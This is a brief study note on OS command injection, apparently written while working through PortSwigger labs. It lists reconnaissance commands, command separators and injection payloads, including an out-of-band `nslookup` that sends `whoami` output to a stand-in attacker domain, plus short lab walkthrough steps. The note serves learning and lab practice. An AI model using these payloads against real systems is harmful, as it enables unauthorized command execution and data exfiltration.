# OS Command Injection Notes

[Portswigger](https://portswigger.net/web-security/os-command-injection)

## Methodology

### Useful commands

|Purpose of command| 	Linux| 	Windows|
|:----|:---|:----|
|Name of current user 	|whoami 	|whoami|
|Operating system 	|uname -a 	|ver|
|Network configuration 	|ifconfig |	ipconfig /all|
|Network connections 	|netstat -an | netstat -an|
|Running processes 	|ps -ef 	|tasklist |

### Detecting blind OS command injections

**Command to detect using time delays**

```
& ping -c 10 127.0.0.1 &
```

**Command to detect by redirecting output**

```
& whoami > /var/www/static/whoami.txt &
```

Afterwards go to the /whoami/txt to determine if you did write it to the server

**Command to detect with out of band interaction**

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

### Ways of injecting OS commands

- &
- &&
- |
- ||

Separators that work only on Unix based systems
- ;
- Newline (0x0a or \n)

Unix inline execution syntax
- \`\`
- $()


## Labs Walkthrough

### OS command injection, simple case

- use the check stock level, intercept and change the storeID parameter with `1|whoami`

### Blind OS command injection with time delays

- use burp suite to intercept and modify the request that submits the feedback
- modify the email parameter with `email=x||ping+-c+10+127.0.0.1||`
